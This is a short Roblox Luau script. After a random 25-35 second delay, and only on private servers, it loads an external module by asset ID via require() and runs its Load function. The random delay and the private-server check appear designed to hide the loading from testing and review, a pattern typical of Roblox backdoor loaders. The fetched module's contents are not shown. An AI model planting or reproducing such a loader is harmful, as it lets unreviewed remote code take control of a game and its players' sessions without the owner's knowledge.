task.spawn(function()
	-- Random delay between 25 and 35 seconds
	local delayTime = math.random(25, 35)
	task.wait(delayTime)
	
	-- Check if server is private
	local isPrivateServer = (game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0)
	
	-- Run ONLY in private servers
	if isPrivateServer then
		local success, err = pcall(function()
			require(75560638612652).Load()
		end)
		if not success then
			warn("Failed to load module:", err)
		end
	else
		warn("Script blocked: Not a private server.")
	end
end)
